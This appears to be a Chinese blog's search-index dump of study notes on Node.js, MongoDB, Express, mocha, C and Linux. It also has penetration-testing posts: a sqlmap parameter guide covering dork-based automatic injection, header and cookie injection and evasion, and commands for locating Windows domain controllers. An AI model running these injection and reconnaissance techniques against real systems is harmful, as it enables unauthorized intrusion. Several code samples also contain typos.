\u003ctitle\u003e首页\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e 首页 \u003cimg src=\"./img\" alt=\"\"\u003e \u003c/body\u003e \u003c/html\u003e file.js var fs = require('fs') //读html文件 module.exports = { readFile: (file, res) =\u003e { fs.readFile(file, 'utf-8', (err, data) =\u003e { if(err) throw err; res.writeHead(200, {'Content-Type':'text/html; charset=utf-8'}) res.write(data) res.end() })}, readImg: (file, res) =\u003e { fs.readFile(file, 'binary', (err, data) =\u003e { if(err) throw err; res.writeHead(200, {'Content-Type':'image/jpeg'}) res.write(data, 'binary') res.end() }) } } route.js var file = require('./file.js') module.exports = { home: (req, res) =\u003e { //res.write(\"欢迎来到首页\") // 默认路由 file.readFile('./views/home.html', res) }, login: (req, res) =\u003e { res.write(\"登录界面\") // 处理路由 }, registor: (req, res) =\u003e { res.write(\"注册界面\") // 处理路由 }, img: (req, res) =\u003e { //读取文件，也新建一个模块 file.readImg('./images/1.jpg', res) } } router_03.js var http = require('http') var url = require('url') var route = require('./modules/route.js') http.createServer((req, res) =\u003e { if(req.url !== '/favicon.ico'){ var pathName = url.parse(req.url).pathname.replace(/\\//,'') console.log(pathName); try{ //最简单的异常处理 route[pathName](req, res) } catch(err){ route['home'](req, res) //默认路由，如果不存在哪个路由，就返回这个路由 } } //res.end() }).listen(8000) console.log('Server running at http://localhost:8000'); 路由传递参数 1.get方式 login.html \u003cform action=\"./login\" method=\"get\"\u003e \u003clabel for=\"email\"\u003e 邮箱: \u003cinput type=\"text\" name=\"email\" value=\"\"/\u003e \u003c/label\u003e \u003clabel for=\"password\"\u003e 密码: \u003cinput type=\"password\" name=\"password\" value=\"\"/\u003e \u003c/label\u003e \u003clabel for=\"submit\"\u003e \u003cinput type=\"submit\" value=\"提交\" /\u003e \u003c/label\u003e toute.js var file = require('./file.js') var url = require('url') module.exports = { login: (req, res) =\u003e { var urlObject = url.parse(req.url, true).query // 通过url解析html表单数据 console.log(urlObject.email) console.log(urlObject.password) file.readFile('./views/login.html', res, req) } } 2.post方式 route.js var file = require('./file.js') var url = require('url') var queryString = require('queryString') module.exports = { login: ","date":"2020-03-27","objectID":"/node-js-%E5%85%A5%E9%97%A8/:5:0","tags":["Node.js","编程"],"title":"Node.js 入门","uri":"/node-js-%E5%85%A5%E9%97%A8/"},{"categories":["Node.js"],"content":"六. Socket 1). 基于net模块实现socket 聊天案例 server.js var net = require('net') var chatServer = net.createServer(), clientMap = new Object() var i = 0; //客户端连接流水号 chatServer.on('connection', function (client){ client.name = ++i clientMap[client.name] = client console.log(\"客户端 \"+ client.name +\" 连接成功~\"); //对客户端发送消息的监听 client.on('data', function (data){ console.log(\"客户端传来：\" + data); broadcast(data, client) //广播给其他 }) //数据错误的处理 client.on('error', function (err){ console.log(\"client error: \" + err); client.end() }) //客户端关闭事件 client.on('close', function (data){ delete clientMap[client.name] console.log(client.name + \"下线了\"); broadcast(client.name+\"下线了\", client) //广播给其他 }) }) chatServer.listen(9000) //监听端口 //消息广播 function broadcast (message, client){ for(var key in clientMap){ clientMap[key].write(client.name + ' say:' + message + \"\\n\") } } client.js var net = require('net') var port = 9000 var host = '127.0.0.1' var client = new net.Socket() client.setEncoding = 'UTF-8' //连接服务器 client.connect(port, host, function () { client.write(\"您好\") }) //监听服务端消息 client.on('data', function (data) { console.log(\"服务端传来：\" + data); say() }) client.on('error', function (err){ console.log(err); }) client.on('close', function (err){ console.log('connection closed'); }) const readline = require('readline') const r1 = readline.createInterface({ input: process.stdin, //标准输入 output: process.stdout }) function say() { r1.question('请输入：', (inputStr =\u003e { if (inputStr != 'bye'){ client.write(inputStr + '\\n') }else{ client.distory() //关闭连接 r1.close() } })) } 2). 浏览器原生支持的WebSocket npm install ws 案例同上 server.js var wbsocketServer = require('ws').Server, wss = new wbsocketServer({port:9001}) var clientMap = new Object() var i=0 wss.on('connection', function (ws){ ws.name = ++i clientMap[ws.name] = ws console.log(ws.name + \" 上线了\"); ws.on('message', function (message){ broadcast(message, ws) }) ws.on('close', function (message){ // global.gc() //调用内存回收 console.log(ws + \" 离开\"); }) }) //广播方法 function broadcast(msg, ws){ for(var key in clientMap){ clientMap[key].send(ws.name + '说：' + msg) } } client.js var WebSocket = require('ws') var ws = new WebSocket('ws://127.0.0.1:9001/') ws.onopen = function () { ws.send('大家好') } ws.onmessage = function (event) { var chatroom = document.getElementById('chatroom') chatroom.innerHtml += '\u003c/br\u003e' + event.data } ws.onclose = function () { alert('Closed') } ws.onerror = function (err) { alert('Error:' + err) } chat.html \u003cbody\u003e \u003cdiv id=\"chatroom\"\u003e\u003c/div\u003e \u003cinput type=\"text\" name=\"sayinput\" id=\"sayinput\" value=\"\"\u003e \u003cinput type=\"button\" name=\"send\" id=\"sendbutton\" value=\"发送\"\u003e \u003cscript src=\"client.js\"\u003e\u003c/script\u003e \u003cscript type=\"text/javascript\"\u003e function send(){ ws.send(sayinput.value) sayinput.vaule = \"\" } document.onkeyup = function(event){ if (event.keycode == 13){ send() } } sendbutton.onclick = function (){ send() } \u003c/script\u003e \u003c/body\u003e 3). socket.io实现socket 当浏览器不支持html5时，就不能用websocket了 借助express实现: npm i express socket.io socket_io.js var app = require('express')() var http = require('http').Server(app) vat io = require('socket.io')(http) var fs = require('fs') app.get('/', (req,res)=\u003e{ function callback(data) { res.send(data.toString()) } fs.readFile('socketIOClient.html', function (err, data){ if(err){ console.log(err); console.log(\"文件不存在\"); }else{ callback(data) } }) }) // app.get('/socket.io.js') //socket.io的设置 //在线用户 var onlineUsers = {} //在线人数 var onlineCount = 0 var 1 = 0 io.on('connection', function (socket){ console.log(\"有人上线了\"); //监听新用户加入 socket.name = i onlineUsers[socket.name] = socket //监听用户退出 socket.on('disconnect', function (){ console.log(\"有人退出了\"); delete onlineUsers[socket.name] }) //监听用户发布的聊天内容 socket.on('message', function (msg){ broadcast(msg, socket) }) }) //广播方法 function broadcast(msg, socket){ for(var key in onlineUsers){ onlineUsers[key].send(socket.name + '说：' + msg) } } http.listen(9002, function (){ console.log(\"\"); }) html \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003cmeta charset=\"utf-8\"\u003e \u003ctitle\u003e\u003c/title\u003e \u003cstyle\u003e #chatroom{ width:400px; hei","date":"2020-03-27","objectID":"/node-js-%E5%85%A5%E9%97%A8/:6:0","tags":["Node.js","编程"],"title":"Node.js 入门","uri":"/node-js-%E5%85%A5%E9%97%A8/"},{"categories":["Node.js"],"content":"七.MongoDB 安装(Linux下) 1. 通过公钥对资源包一致性和真实性进行验证： sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv 9DA31620334BD75D9DCB49F368818C72E52529D4 2. 运行下行命令，创建文件/etc/apt/sources.list.d/mongodb-org-4.0.list： echo \"deb [ arch=amd64 ] https://repo.mongodb.org/apt/ubuntu bionic/mongodb-org/4.0 multiverse\" | sudo tee /etc/apt/sources.list.d/mongodb-org-4.0.list 3. 在安装之前，先更新系统资源包： sudo apt-get update 4. 安装mongodb资源包： # 安装MongoDB server sudo apt-get install -y mongodb-org # 安装MongoDB 客户端 sudo apt-get install mongodb-clients 4. 检验是否安装成功： 启动mongod服务： sudo service mongod start #查看mongo版本: mongo --version 5.登录MongoDB并设置密码 # 登录 mongo # 切换到admin数据库 use admin # 创建admin账号，密码::admin111 权限：root权限，授权的数据库名：admin db.createUser({user:\"admin\", pwd:\"admin111\", roles:[{role:\"root\", db:\"admin\"}]}) 编辑MongoDB配置文件 vim /etc/mongod.conf net: port: 27017 # 端口 bindIp: 0.0.0.0 # 允许访问的地址，0.0.0.0表示所有 security: authorization: enabled 重启MongoDB服务 systemctl restart mongod.service 测试登录 mongo -u admin -p admin111 --authenticationDatabase admin 学习 与mysql语法对比：https://www.jb51.net/article/65626.htm?tdsourcetag=s_pctim_aiomsg 术语、概念 MongoDB集合 一个数据库可以有多个集合(对应mysql的table) MongoDB文档 键值对 如：{'name':'xps', 'like':['code','play']} MongoDB数据类型 常用命令 1.数据库操作 查看帮助 help db.help() db.test.help() df.test.find().help() 创建/切换数据库 use music # 如果不存在就创建，存在且切换 查询数据库 show dbs # 当数据库为空时，是不显示的 # 我们向一个集合里面插入一个文档 db.user.insertOne({'name':'xps','like':['code','play']}) # 查看集合里面的文档(行) db.user.find() 查看当前使用的数据库 db # db.getName() 显示当前DB状态 db.stats() 查看当前DB版本 db.version() 查看当前DB的链接机器地址 db.getMongo() 删除数据库 db.dropDatabase() 2.集合（Collection）操作 ….写了半天，忘了保存，算了，放图片吧…. 3.文档操作 对集合内数据增删改查 删除 db.user.remove({'name':'xps'}) db.user.delete({'name':'xps'}) db.user.deleteMany({'name':'xps'}) ","date":"2020-03-27","objectID":"/node-js-%E5%85%A5%E9%97%A8/:7:0","tags":["Node.js","编程"],"title":"Node.js 入门","uri":"/node-js-%E5%85%A5%E9%97%A8/"},{"categories":["Node.js"],"content":"八. Express框架 一个node.js的web框架 1). 准备 安装 npm install express --save, Windows下还有:npm install -g express-generator express -h 测试安装成功 新建项目：express test_express 目录结构： package.js是需要的依赖，切换到项目根目录手动安装npm install app.js是入口 www/bin下面是端口等配置 启动项目： npm start 2). Express初始化项目详解 一些模块 \"dependencies\": { //\"body-parser\": \"~1.15.2\", // 解析前端提交的数据 \"cookie-parser\": \"~1.4.4\", //解析cookie \"debug\": \"~2.6.9\", // 用来显示调试信息 //\"ejs\": \"~2.5.2\", //模板，渲染页面 \"express\": \"~4.16.1\", \"http-errors\": \"~1.6.3\", \"jade\": \"~1.11.0\", //模板，渲染页面 \"morgan\": \"~1.9.1\" //日志，控制后格式化显示信息 } bin/www入口文件 实现了创建服务和中间件、路由配置 normalizePort() 方法，对端口进行简单处理 1.路由中间件 2.自定义中间件（app.set('port', port)这样） app.use() app.js app.use(express.static(path.join(__dirname, 'public'))); //设置静态文件路径 ... var usersRouter = require('./routes/users'); app.use('/users', usersRouter); router/xxx.js 路由的中间件 //这里的index就是view下面的index.jade res.render('index', { title: 'Express' }); //渲染模板 ， index不用写后缀名 #比如 index.js var express = require('express'); var router = express.Router(); // get('/', xxx) 因为前面写了/user，所以这里只写/即可 router.get('/', function(req, res, next) { res.send('respond with a resource'); }); module.exports = router; // 暴露出去，才能以中间件的形式存在 views/xxx.jade 模板文件 3). Express中的路由 users.js var express = require('express'); var router = express.Router(); /* GET users listing. */ router.get('/', function(req, res, next) { res.send('respond with a resource'); }); // 第二层路由，第一层在app.js里 router.get('/list', function(req, res) { res.send('user list'); }); // 可以写成表达式（正则） router.get('/a*d', function(req, res) { res.send('表达式路由'); }); //转到一个文件 router.get('/form', function(req, res) { res.sendFile(__dirname + '/form.html') }); //post请求 router.post('/save', function(req, res) { res.send(\"表单提交!\") }); // all， post和get都接收 router.all('/all',function(req, res) { res.send(\"post和get都接收!\") }); module.exports = router; form.html \u003cform action=\"/users/save\" method=\"post\" class=\"formClass\"\u003e \u003clabel for=\"username\"\u003e username: \u003cinput type=\"text\" name=\"username\" value=\"\"/\u003e \u003c/label\u003e \u003clabel for=\"submit\"\u003e \u003cinput type=\"submit\" value=\"提交\" /\u003e \u003c/label\u003e \u003c/form\u003e 4). Express中的模板 ejs/jade等 ejs比较简单 #安装（express内置了ejs） npm install ejs --save #配置ejs模板引擎 app.set('view engine','ejs') #渲染页面 render(filename,json)接收两个参数。 #如下 app.get('/learnejs',function(req,res){ let arr=['吃饭','睡觉','打豆豆'] res.render('index',{ list_a:arr }) }) #index.ejs \u003cul\u003e \u003c%for(var i=0;i\u003clist_a.length;i++){%\u003e \u003cli\u003e\u003c%=list[i]%\u003e\u003c/li\u003e \u003c%}%\u003e \u003c/ul\u003e 渲染页面 # render(filename,json)接收两个参数。 常用标签 \u003c% %\u003e 流程控制标签 \u003c%= %\u003e 输出标签（原文输出html标签） \u003c%- %\u003e 输出标签（html会被浏览器解析） \u003c%# %\u003e 注释标签 % 对标记进行转义 includes,在一个模板里面引用另一个模板 \u003c%- include(\"模板路径\", {user:\"传递的参数内容\"}) %\u003e ","date":"2020-03-27","objectID":"/node-js-%E5%85%A5%E9%97%A8/:8:0","tags":["Node.js","编程"],"title":"Node.js 入门","uri":"/node-js-%E5%85%A5%E9%97%A8/"},{"categories":["Node.js"],"content":"九.mocha 前端测试框架 浏览器和Node环境都可使用 安装： # 安装 npm install mocha -g #命令 mocha #本地安装 npm install mocha -D # 修改配置文件中test命令 \"test\": \"......./bin/mocha\" # 运行 npm test 基本用法 定义测试： 创建一个js文件 describe(\"Demo\", function (){ describe(\"方法1\", function (){ before(function (){ //测试之前做的内容 console.log(\"---测试之前做的内容\") }) after(function (){ //测试之后做的内容 console.log(\"---测试之前后做的内容\") }) beforeEach(function (){ //每条测试之前做的内容 console.log(\"---每条测试之前做的内容\") }) context(\"情景1\", function (){ it(\"测试1\", function (){ }) it(\"测试2\", function (){ }) }) }) }) mocha 来启动测试/ 或使用本地安装的mocha来测试npm test assert断言 使用库：chai chai: 断言库 chai: should分割的断言 chai：expect风格的断言 安装到本地：npm install chai -D 使用 const chai = require('chai') const assert = chai.assert describe('Demo', function (){ it(\"使用 assert风格的断言测试\", function (){ var val = 'hello' assert.typeOf(val, 'string') assert.equal('hello') }) }) const chai = require('chai') const sholud = chai.sholud describe('Demo', () =\u003e { it(\"使用 sholud风格的断言测试\", function (){ var val = 'hello' val.sholud.exist val.sholud.be.a('string') val.sholud.equal('hello') val.sholud.not.equal('hello') val.sholud.have.length() //多个条件逻辑与 val.sholud.equal('hello').and.exist.and.be.a('string') }) }) const chai = require('chai') const expect = chai.expect describe('Demo', () =\u003e { it(\"使用 expect风格的断言测试\", function (){ var val = 'hello' var number = 3 expext(number).to.be.at.most(5) expext(number).to.be.at.least(3) expext(number).to.be.at.within(1,8) expect(value).to.exist expect(value).to.be.a('string') expect(value).to.equal('hello') expect(value).to.not.equal('hello') expect(value).to.have.length(5) }) }) 运行多个测试 mocha --recursive # 递归 好了，再学就跑偏了…… 😄 ","date":"2020-03-27","objectID":"/node-js-%E5%85%A5%E9%97%A8/:9:0","tags":["Node.js","编程"],"title":"Node.js 入门","uri":"/node-js-%E5%85%A5%E9%97%A8/"},{"categories":["C语言"],"content":" 由于好久时间不看C了，好多东西都忘了 本文是跟着郝斌老师的视频做的随堂笔记，课下也没做整理，并不成系统，只是一些简单堆叠，且编码规范都没有，看看就好哈哈 字符串 char greeting[6] = {'H', 'e', 'l', 'l', 'o', '\\0'}; //1 strcpy(s1, s2); 复制字符串 s2 到字符串 s1。 //2 strcat(s1, s2); 连接字符串 s2 到字符串 s1 的末尾。 //3 strlen(s1); 返回字符串 s1 的长度。 //4 strcmp(s1, s2); 如果 s1 和 s2 是相同的，则返回 0；如果 s1\u003cs2 则返回小于 0；如果 s1\u003es2 则返回大于 0。 //5 strchr(s1, ch); 返回一个指针，指向字符串 s1 中字符 ch 的第一次出现的位置。 //6 strstr(s1, s2); 返回一个指针，指向字符串 s1 中字符串 s2 的第一次出现的位置。 //strlen 与 sizeof的区别： strlen 是函数 sizeof 是运算操作符 二者得到的结果类型为 size_t，即 unsigned int 类型。 sizeof 计算的是变量的大小，不受字符 \\0 影响； strlen 计算的是字符串的长度，以 \\0 作为长度判定依据。 // 'a' 表示是一个字符，\"a\" 表示一个字符串相当于 'a'+'\\0'; //字符串遍历 char hi[] = \"hello\"; for(i==0, i\u003c6,i++) { printf(\"%c\",hi[i]); } 运算符优先级nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnhjjjjjjjjjjjjjjj 优先级 运算符 名称或含义 使用形式 结合方向 说明 1 [] 数组下标 数组名[常量表达式] 左到右 () 圆括号 （表达式）/函数名(形参表) . 成员选择（对象） 对象.成员名 -\u003e 成员选择（指针） 对象指针-\u003e成员名 2 - 负号运算符 -表达式 右到左 单目运算符 (类型) 强制类型转换 (数据类型)表达式 ++ 自增运算符 ++变量名/变量名++ 单目运算符 – 自减运算符 –变量名/变量名– 单目运算符 * 取值运算符 *指针变量 单目运算符 \u0026 取地址运算符 \u0026变量名 单目运算符 ! 逻辑非运算符 !表达式 单目运算符 ~ 按位取反运算符 ~表达式 单目运算符 sizeof 长度运算符 sizeof(表达式) 3 / 除 表达式/表达式 左到右 双目运算符 * 乘 表达式*表达式 双目运算符 % 余数（取模） 整型表达式/整型表达式 双目运算符 4 + 加 表达式+表达式 左到右 双目运算符 - 减 表达式-表达式 双目运算符 5 « 左移 变量«表达式 左到右 双目运算符 » 右移 变量»表达式 双目运算符 6 \u003e 大于 表达式\u003e表达式 左到右 双目运算符 \u003e= 大于等于 表达式\u003e=表达式 双目运算符 \u003c 小于 表达式\u003c表达式 双目运算符 \u003c= 小于等于 表达式\u003c=表达式 双目运算符 7 == 等于 表达式==表达式 左到右 双目运算符 != 不等于 表达式!= 表达式 双目运算符 8 \u0026 按位与 表达式\u0026表达式 左到右 双目运算符 9 ^ 按位异或 表达式^表达式 左到右 双目运算符 10 | 按位或 表达式|表达式 左到右 双目运算符 11 \u0026\u0026 逻辑与 表达式\u0026\u0026表达式 左到右 双目运算符 12 || 逻辑或 表达式||表达式 左到右 双目运算符 13 ?: 条件运算符 表达式1? 表达式2: 表达式3 右到左 三目运算符 14 = 赋值运算符 变量=表达式 右到左 /= 除后赋值 变量/=表达式 *= 乘后赋值 变量*=表达式 %= 取模后赋值 变量%=表达式 += 加后赋值 变量+=表达式 -= 减后赋值 变量-=表达式 «= 左移后赋值 变量«=表达式 »= 右移后赋值 变量»=表达式 \u0026= 按位与后赋值 变量\u0026=表达式 ^= 按位异或后赋值 变量^=表达式 |= 按位或后赋值 变量|=表达式 15 , 逗号运算符 表达式,表达式,… 左到右 从左向右顺序运算 注：同一优先级的运算符，运算次序由结合方向所决定。 数组 main.c #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cstring.h\u003e // 2.二维数组 /** int a[3][4]; 总共12个元素，可以当做3行4列看待，依次是: a[0][0],a[0][1],a[0][2],a[0][3] a[1][0],a[1][1],a[1][2],a[1][3] a[2][0],a[2][1],a[2][2],a[2][3] a[i][j] ==\u003e i+1行，j+1列的元素 int a[m][n]; 该二位数组的右下角位置的元素只能是a[m-1][n-1] */ void init_double() { //1.最笨的初始化 int a[3][4]={1,2,3,4,5,6,7,8,9,10,11,12}; //2.分开写（格式要写正确） int b[3][4]={ {1,2,3,4}, {5,6,7,8}, {9,10,11,12} }; //3.其他各种初始化 // 输出二维数组内容 int i, j; for(i=0;i\u003c3;++i) { for(j=0; j\u003c4; ++j) { printf(\"%-5d \\t\", b[i][j]); // 付好：左对齐，5代表占5个位置（这不是重点，格式控制有其他控制办法） } printf(\"\\n\"); // 格式化(每四个一行) } // 二维数组排序 //求每一行最大值 // } // 多维数组： /* 1. 不存在! 因为内存是线性一维的 2. n维数组可以当做 每个元素是n-1维数组的一维数组 的数组 比如：a[3][4]，可以当做含有三个元素的一维数组，只不过每个元素都可以划分为4个小元素 */ 函数 func.h #include \u003cstdio.h\u003e int after_func(); // 函数的声明， 可以不写变量名 void get_max(int, int); // 函数声明，记得加分号 main.c #include \"func.h\" void before_func() { printf(\"我是函数测试，在主函数之前定义的。\"); getchar(); } void main() { // 函数定义写在主函数之前的时候，那么就无需在主函数里面声明这个函数，只需要把函数体写在主函数前即可 //否则，需要先声明. // 此函数定义在主函数之前，直接调用即可，无须声明 //before_func(); //在主函数之后定义的，需要先声明才能调用。 //1.声明(要放在main外面，我放在了自定义的头文件里面) //2.调用 //after_func(); // 求最大值 //int i,j; //i=5;j=10; //get_max(i, j); int i; for(i=0;i\u003c20;++i) { get_max(i,i+1); } getchar(); } int after_func() { printf(\"我是函数测试，在主函数之后定义的，需要先声明才能调用。\"); getchar(); return 0; } //求最大值 void get_max(int a, int b) { int max_val = a\u003eb?a:b; printf(\"%d和%d比较，最大值为: %d \\n\", a,b,max_val); } /* return和break的区别： 1.break:循环、switch 2.return终止函数 */ /* 函数的分类： 1.有参函数和无参函数 2.有返回值和无返回值 3.库函数和用户自定义函数 4.普通函数和主函数(main)：一个程序只能有一个主函数，主函数既是程序的入口，也是程序的出口 主函数能调用主函数，其他函数不能调用main函数，普通函数可以相互调用 5.值传递和引用传递(其实这样说是不对的) */ /* 如何在软件开发中，合理的设计函数来解决实际问题： 功能划分的详细一些，提高利用率 函数是C语言的基本单位，类是Java，C#等的基本单位 */ /* 常用的系统函数: 1. doulbe sqrt(double x) 求x的平方根 2. int abs(int x) 求整数的绝对值 3. double fabs(double x) 推荐书籍： 机械工业出版社：《turboc2.0使用大全》 */ /* 递归： 栈：先进先出 */ /* 变量的作用于和存储方式： 1.按作用域分：全局变量，局部变量（函数内部定义的变量/函数的形参） 2.按变量的存储方式：静态变量，自动变量，寄存器变量 */ int k=99; void test_var() { //局部变量与全局变量命名相同：局部变量会屏蔽掉全局变量 } 指针 test.h #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cstring.h\u003e #define N 5 void test1(); void test2(); void test3(); void test4(); void test5(); void test6(); void test7(); void test8(); void base_pointer(); void free_","date":"2020-03-26","objectID":"/c%E8%AF%AD%E8%A8%80%E7%90%90%E7%A2%8E%E5%A4%8D%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%80%E5%8D%95-%E4%BB%85%E8%87%AA%E5%B7%B1%E7%9C%8B/:0:0","tags":["C语言","琐碎复习"],"title":"C语言琐碎复习（内容简单,仅自己看）","uri":"/c%E8%AF%AD%E8%A8%80%E7%90%90%E7%A2%8E%E5%A4%8D%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%80%E5%8D%95-%E4%BB%85%E8%87%AA%E5%B7%B1%E7%9C%8B/"},{"categories":["渗透测试"],"content":" 概述 官网 其他特性： 数据库直接连接 -d, 不通过SQL注入，执行身份认证信息，ip，端口 与BurpSuite，Google结合使用，支持政策表但是限定测试目标 支持Basic, Digest, BTLM, CA 身份认证 db版本， 用户，权限，hash枚举和字典破解，暴力破解表列名称 文件上传下载，UDF， 启动并执行存储过程，操作系统命令执行，访问win注册表 与w3af， metasploit集成结合使用，基于数据库服务进程提权和上传执行后门 升级: # 在线更新sqlmap sqlmap --update # 离线升级 git pull 其他常识： # 结果文件夹位置 /.root/sqlmap/output # 日志 .sqlmap # 配置文件 自己找 基本参数 1. Target Get方法： -u url链接 # get链接 -f # 检查DBMS的指纹信息 -p user_name # 指定字段参数 -m list.txt # 扫描url列表文件 -g # google搜索,自动去google找到然后自动注入 \\” 是转义引号，如下所示： # 例如： sqlmap -g \"inurl:\\\".php?id=1\\\" # 结果文件夹位置 /.root/sqlmap/output -- users # 有哪些user --banner # banner 信息 --dbs # 有哪些库 --schema #元数据(查的是informatin_schema信息，前提是有权限) -a # 所有的 -d “mysql://root:@192.168.20.10:3306/dvwa” # 让sqlmap作为客户端链接数据库（dvwa是数据库名称） Post方法： 就不是通过url来扫描了，而是body来进行扫描 -r request.txt # 使用http请求文件进行注入（burpsuite拦截的请求数据包复制保存到文件, 存在注入的位置用*标出） -l log.txt # 使用burpsuite log文件 （使用burpsuite:option-\u003e Misc -\u003elogging -\u003e 这里选择Proxy-\u003e 这里选择requests-\u003e 选择log文件保存位置 ） --force-ssl # 支持Https，即听过https来进行请求，或在url域名后+443端口也可以 -c sqlmap.conf # 扫描配置文件（把扫描配置写到里面，把它引用即可） # 查找文件 dpokg -L # 找有关..的文件包 dpokg -L sqlmap | grep sqlmap.conf 2. Request post请求 --data=\"user=xx\u0026pswd=yy\" # 数据（对于post请求：除了保存请求头的方法，也可以这样data加参数， 也支持get方法：参数放--data后面） --param-del=\";\" # 变量分隔符(若多个变量不是以\u0026分割),如：参数以分号分割 --data=\"name=1;id=11\" --param-del=\";\" --cookie \"xxxxxxxxx\" --level=2 # 带上cookie头(level=2时才会检查cookie是否存在注入点) 参数: set-cookie / --drop-set-cookie 是否丢弃上一个cookie,使用新的cookie #cookie ---\u003e 登陆后才能访问的页面 --user-agent=\"xxxxxxxxxx\" # 指定ua头 --random-agent --level=3 # 随机ua头字典: /usr/share/sqlmap/txt/user-agents.txt, win下：sqlmap/data/txt/user-agents.txt #--level\u003e=3 # 才会检查user-agent头是否存在sql注入 #app/waf/IPS/IDS过滤异常的ua头，sqlmap会报错 --host \"aaaaaaa\" --level=5 # host头 --level=5 # 才会检查host头是否存在sql注入(一般不建议设置这么高) --referrer --level=3 # 检查referrer --level \u003e=3 # 才会检查referrer是否存在sql注入 --headers=\"host:www.a.com\\nUser-Agent:xps\" # 额外的自定义的headers（\\n是换行，注意大小写） --headers=\"X-Forwarded-For:* \" --dbs --batch --method=GET/POST # 限定请求方法 基于http身份认证 三种身份认证类型： Basic Diagest NTLM --auth-type Basic --auth-cred \"user:pass\" # --auth-type指定身份认证类型，后门是账号密码 基于客户端证书的身份认证 : # 用的很少 # 下面两种参数不知道是哪个了，使用的时候自己查一下 --auth-cert --auth-file=\"ca.PEM\" #含有私钥的PEM的证书文件 http(s)代理 使用代理防止被封等 --proxy=\"http://127.0.0.1:8888\" # 本地网络的话不需要代理设置 --auth-cred \"user:pass\" # 如果需要身份认证 --ignore-proxy # 忽略系统代理设置，通常用户扫描本地网络目标（用于对本地/内容目标进行扫描的时候） 超时 --deplay=\"6\" # 每次请求之间延迟时间， 单位:s --timeout=\"10\" # 请求超时时间，浮点数，默认30s --retries=\"5\" # 连接超时重试次数，默认3次 --randomsize=\"id\" # 长度、类型与原始值保持一致的前提下，指定每次请求随机取值 的参数name（对id随机取值,但长度与原始是一致的） --scope # 过滤日志(burp的request日志--\u003eoption,Logging,proxy,requests)内容， 通过正则筛选扫描对象； -l burp.log --scope=\"{www}?\\.target\\.{com|net|org}\" --level=3 --safe-url / --safe-freq # 检测和盲注阶段会产生大量失败请求，服务端可能因此销毁session。 #因此：每发送 --safe-freq次注入请求之后，发送一次正常的请求 --skip-urlencode # 跳过url编码(默认GET方法会对内容进行编码，某些编码人员不遵守编码规则没编码) --eval=\"import hashlib;hash=hashlib.md5(id).hexdigest()\" # 每次请求之前执行的py代码 / 每次请求更改或者增加新的参数值（时间依赖。其他参数依赖）后面值是依赖前面值的 -u \"id=1?hash=c4ca423dj8caf5d\" --eval =\"import hashlib;hash=hashlib.md5(id).hexdigest()\" # 比如后面参数是hash的，每次都把id编码 #### \u003cfont color=red\u003e3. Detection \u003c/font\u003e 风险等级 ​```bash --level # 1-5级（默认1） payload文件xml：/usr/share/sqpmap/xml/payloads， win：sqlmap\\data\\xml\\payloads --risk # 1-4级(默认1/无害), risk升高可能造成数据被篡改风险(update),2会增加事件的测试语句，3会增加OR语句的sql注入测试 --string / --not-string / --regexp / --code / --text-only / --titles # 页面比较，基于bool的注入监测，依据返回页面内容的百年华判断真假逻辑。但有些页面随着时间阈值变化，此时需要人为执行标识真假的字符串 4. Optimization 优化性能相关的参数 --predict-output # 预设输出。根据检测方法，比对返回值和统计表内容，不断缩小监测范围；版本名，用户名，密码，Provileges，role，db名，表名，列名； #与--threads不兼容；统计表 #进而精确定位是什么数据库和版本等， /usr/share/sqlmap/txt/common-outputs.txt --keep-alive # 使用长连接，性能好，与--proxy不兼容， 但是大量长连接会严重占用服务器资源 --null-connection # 只获取相应页面大小值，而非内容； 【用于盲注判断 真假】，降低网络带宽消耗；与--text-only参数不兼容(基于页面内容比较判断 真假) --threads=10 # 最大并发线程，盲注时每个线程获取一个字符（7次请求），获取完成后线程结束；默认1，建议不要大于10（可能会影响站点性能） -o # 开启前三个性能参数（除了--threads） 指纹信息 # Figerprint -f / --figerprint / -b / --banner # dbms指纹信息； DBMS，操作系统，架构，补丁 ​ 5. Enumeration 枚举 --schema --batch --exclude-sysdbs # sschema","date":"2020-03-22","objectID":"/sqlmap%E5%8F%82%E6%95%B0%E7%AE%80%E4%BB%8B/:0:0","tags":["渗透测试","sqlmap"],"title":"sqlmap参数简介","uri":"/sqlmap%E5%8F%82%E6%95%B0%E7%AE%80%E4%BB%8B/"},{"categories":["渗透测试"],"content":"查找域控的几个常用方法 1.net view net view /domain 2.set log set log 3.通过srv记录 nslookup -type=SRV _ldap._tcp.corp 4.使用nltest nltest /dclist:corp 5.使用dsquery DsQuery Server -domain corp 6.使用netdom netdom query pdc ","date":"2020-03-20","objectID":"/%E6%9F%A5%E6%89%BE%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%87%A0%E4%B8%AA%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95/:0:0","tags":["渗透测试","域控"],"title":"查找域控的几个常用方法","uri":"/%E6%9F%A5%E6%89%BE%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%87%A0%E4%B8%AA%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"参考：http://www.hackdig.com/01/hack-42547.htm 0x01 列出某个目录下今天创建或者修改的文件 1 显示目录home/ym下，今天创建或者修改的文件 ls -al --time-style=+%D | grep 'date +%D' 参数解释： -a - 列出所有文件，包括隐藏文件 -l - 启用长列表格式 --time-style=FORMAT - 显示指定 FORMAT 的时间 +％D - 以 ％m/％d/％y （月/日/年）格式显示或使用日期-a - 列出所有文件，包括隐藏文件 -l - 启用长列表格式 --time-style=FORMAT - 显示指定 FORMAT 的时间 +％D - 以 ％m/％d/％y （月/日/年）格式显示或使用日期 2 按字母顺序对结果排序显示 ls -alX --time-style=+%D | grep 'date +%D' 3 按文件大小从大到小对结果排序显示 ls -alS --time-style=+%D | grep 'date +%D' 0x02 列出某天所有被修改文件 1 列出当前目录今天被修改的文件 find . -maxdepth 1 -newermt \"2017-1-8\" find . -maxdepth 1 -newermt \"1/8/2017\" 2 列出系统中今天被修改的所有文件 find . -newermt \"2017-1-8\" find . -newermt \"1/8/2017\" 0x03 查找被访问过的文件 1 今天被访问的文件 find /home -atime 0 #查看home 目录下今天被访问的文件 2 